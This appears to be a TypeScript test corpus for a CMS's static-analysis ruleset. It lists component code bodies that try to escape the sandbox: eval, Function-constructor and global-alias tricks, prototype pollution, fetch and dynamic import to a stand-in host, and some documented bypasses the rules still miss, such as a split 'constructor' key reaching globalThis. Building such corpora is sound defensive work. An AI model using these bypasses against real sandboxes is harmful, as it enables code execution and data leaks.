import type { SastRuleId } from '@genoacms/internal/sast'

/**
 * The bypass corpus the SAST ruleset is measured against.
 *
 * Coverage is only worth what the corpus is: one written by the same person who wrote the rules
 * tends to contain what the rules already catch. So provenance is part of every entry, and the
 * two origins are reported apart rather than added together.
 *
 * ## Two origins, never conflated
 *
 *     external    drawn from published sources, one citation each      ← primary evidence
 *     extension   GenoaCMS constructs no public corpus knows about     ← secondary, reported apart
 *
 * **The external half is empty here.** Every entry in it must cite a source that was actually read,
 * and writing citations from memory is the same failure as writing a digest from memory. The harness,
 * the report and the extension entries do not depend on it, so they exist first and the baseline is
 * added to this file as sources are read.
 *
 * ## An entry that escapes is a result
 *
 * Suppressing one would turn a bounded claim into an unfalsifiable one. Each says *why* it escapes,
 * and the three reasons are different things: something no static rule can decide, something a rule
 * could catch and does not, and something the design deliberately does not cover.
 */

/** Where a pattern came from, which decides which coverage figure it counts towards. */
type Origin = 'external' | 'extension'

/**
 * Why a pattern the ruleset does not reject is not a defect in the report.
 *
 * `undecidable` — no static rule can answer it; a runtime guard carries it.
 * `rule-gap`    — a rule could catch it and none does. Fixable, and listed so it can be.
 * `by-design`   — outside what the ruleset claims, such as a capability a consumer granted.
 */
type EscapeKind = 'undecidable' | 'rule-gap' | 'by-design'

type Verdict =
  | { rejects: SastRuleId }
  | { escapes: EscapeKind, carriedBy: string }

interface CorpusEntry {
  id: string
  origin: Origin
  /** Where the pattern comes from. A published source for `external`; the reason it exists for `extension`. */
  cite: string
  /** The body of a component, as an author would write it. */
  body: string
  /** What the ruleset is expected to say, and what carries it when the answer is nothing. */
  verdict: Verdict
}

/**
 * GenoaCMS-specific patterns, and how each was found.
 *
 * Every one of these came from probing this implementation rather than from a public corpus, which
 * is why they are secondary evidence: they measure whether a known bypass stays closed, not whether
 * the ruleset meets patterns it has never seen.
 */
const extension: CorpusEntry[] = [
  {
    id: 'eval-direct',
    origin: 'extension',
    cite: 'The plainest form of the rule, present so coverage has a floor to stand on.',
    body: 'return eval("1 + 1")',
    verdict: { rejects: 'SAST-01' }
  },
  {
    id: 'function-constructor',
    origin: 'extension',
    cite: 'The constructor spelling of the same thing, which a rule matching only `eval` misses.',
    body: 'return new Function("return 1")()',
    verdict: { rejects: 'SAST-01' }
  },
  {
    id: 'global-alias',
    origin: 'extension',
    cite: 'Aliasing, which the plan names as where a denylist quietly fails.',
    body: 'const escape = globalThis; return String(escape)',
    verdict: { rejects: 'SAST-02' }
  },
  {
    id: 'document-to-window',
    origin: 'extension',
    cite: 'Found by probing on 1 September 2026. `document` was permitted, and from it `defaultView` reaches `window` and through it `eval`, storage and the network — one hop through a name nothing banned.',
    body: 'return String(document.defaultView.eval("1"))',
    verdict: { rejects: 'SAST-02' }
  },
  {
    id: 'arguments-reaches-a-reserved-parameter',
    origin: 'extension',
    cite: 'Found by probing on 1 September 2026. A component receives parameters the CMS supplies for its own use, and `arguments[1]` reaches one without naming it.',
    body: 'return arguments[1]("https://elsewhere.test/x")',
    verdict: { rejects: 'SAST-02' }
  },
  {
    id: 'prototype-pollution-computed',
    origin: 'extension',
    cite: 'The bracketed spelling, which is the first thing tried once the dotted one is refused.',
    body: 'const target = {}; target["__proto__"].polluted = true; return null',
    verdict: { rejects: 'SAST-03' }
  },
  {
    id: 'require-a-package',
    origin: 'extension',
    cite: 'A component bringing code nobody signed into an artifact the CMS attests to.',
    body: 'const os = require("os"); return String(os.hostname())',
    verdict: { rejects: 'SAST-04' }
  },
  {
    id: 'network-primitive',
    origin: 'extension',
    cite: 'The primitive the data bridge exists to replace.',
    body: 'return fetch("https://elsewhere.test")',
    verdict: { rejects: 'SAST-05' }
  },
  {
    id: 'bridge-to-a-refused-origin',
    origin: 'extension',
    cite: 'The half of the origin allowlist that is decidable at commit time.',
    body: 'return bridge.fetch("https://elsewhere.test/x")',
    verdict: { rejects: 'SAST-05' }
  },
  {
    id: 'bridge-aliased-first',
    origin: 'extension',
    cite: 'Reported by the author on 1 September 2026, having passed. The rule matched the receiver by text and an alias walked past it.',
    body: 'const b = bridge; return b.fetch("https://elsewhere.test/x")',
    verdict: { rejects: 'SAST-05' }
  },
  {
    id: 'dynamic-import',
    origin: 'extension',
    cite: 'Code fetched as a module, which no signature covers.',
    body: 'return import("https://elsewhere.test/m.js")',
    verdict: { rejects: 'SAST-06' }
  },
  {
    id: 'loop-bound-by-an-undeclared-attribute',
    origin: 'extension',
    cite: 'An attribute with no declared maximum sizing a loop, which is what the bound rule exists for.',
    body: 'for (let i = 0; i < count; i++) { void i }\nreturn ""',
    verdict: { rejects: 'SAST-07' }
  },
  {
    id: 'loop-that-states-no-exit',
    origin: 'extension',
    cite: 'The decidable half of non-termination: a construct with nothing in it that could leave.',
    body: 'while (true) { void 0 }\nreturn ""',
    verdict: { rejects: 'SAST-08' }
  },
  {
    id: 'recursion-with-no-guard',
    origin: 'extension',
    cite: 'A function that calls itself with nothing that could stop it.',
    body: 'function down (n: number): number { return down(n + 1) }\nreturn String(down(0))',
    verdict: { rejects: 'SAST-09' }
  },
  {
    id: 'allocation-sized-at-run-time',
    origin: 'extension',
    cite: 'Reported rather than refused: the size is a runtime value, and the allocation guard is what holds.',
    body: 'const rows = new Array(count)\nreturn String(rows.length)',
    verdict: { rejects: 'SAST-10' }
  },
  {
    id: 'writing-to-what-it-was-given',
    origin: 'extension',
    cite: 'The capability object is shared with the application and with every sibling on the page.',
    body: 'passthrough.cache = "mine"\nreturn ""',
    verdict: { rejects: 'SAST-11' }
  },

  // ── Patterns the ruleset does not reject. Each says why, and what carries it. ──

  {
    id: 'url-assembled-at-run-time',
    origin: 'extension',
    cite: 'The undecidable half of the origin allowlist.',
    body: 'return bridge.fetch("https://" + heading + "/x")',
    verdict: { escapes: 'undecidable', carriedBy: 'the bridge, which refuses the origin when the call is made' }
  },
  {
    id: 'mutual-recursion',
    origin: 'extension',
    cite: 'Deciding it needs a call graph, whose own failure modes the bound rule deliberately does not take on.',
    body: 'function a (n: number): number { return b(n) }\nfunction b (n: number): number { return a(n) }\nreturn String(a(0))',
    verdict: { escapes: 'undecidable', carriedBy: 'the depth guard, and the fuel guard before it' }
  },
  {
    id: 'ownerDocument-of-a-node-it-holds',
    origin: 'extension',
    cite: 'A member on a runtime value, which is why the globals are banned as names instead.',
    body: 'const node = dom.element("div"); return String(node.ownerDocument)',
    verdict: { escapes: 'undecidable', carriedBy: 'the inert document, whose defaultView is null' }
  },
  {
    id: 'url-in-markup-it-builds',
    origin: 'extension',
    cite: 'Found by enumerating the routes to the network on 1 September 2026.',
    body: 'const i = dom.element("img"); i.setAttribute("src", "https://elsewhere.test/p.png"); return i',
    verdict: { escapes: 'rule-gap', carriedBy: 'nothing — closing it needs the returned tree sanitized at the consumer boundary' }
  },
  {
    id: 'event-handler-attribute',
    origin: 'extension',
    cite: 'Found while building the DOM facade on 1 September 2026.',
    body: 'const d = dom.element("div"); d.setAttribute("onclick", "1"); return d',
    verdict: { escapes: 'rule-gap', carriedBy: 'nothing — the same residual as the URL in markup above' }
  },
  {
    id: 'name-assembled-at-run-time',
    origin: 'extension',
    cite: 'Found on 2 September 2026 while writing the live attack demonstration. `constructor` written down is refused; the same three reads with the key built from two halves are not, and reach the global object.',
    body: 'const key = "constr" + "uctor"\nconst reach = ({})[key][key]("return globalThis")()\nreturn String(reach)',
    verdict: { escapes: 'rule-gap', carriedBy: 'nothing — the guards bound what a component spends, and three property reads spend nothing' }
  },
  {
    id: 'capability-the-consumer-granted',
    origin: 'extension',
    cite: 'The boundary the capability channel states rather than hides.',
    body: 'return passthrough.fetch("https://elsewhere.test")',
    verdict: { escapes: 'by-design', carriedBy: 'the consuming application, which chose what to grant' }
  }
]

/**
 * Patterns drawn from published sources, one citation each.
 *
 * **Empty until sources are read.** Coverage reported while this is empty is extension-only, and the
 * report says so rather than presenting a figure that looks like the primary evidence.
 */
const external: CorpusEntry[] = []

const corpus: CorpusEntry[] = [...external, ...extension]

export { corpus, external, extension }
export type { CorpusEntry, Origin, Verdict, EscapeKind }
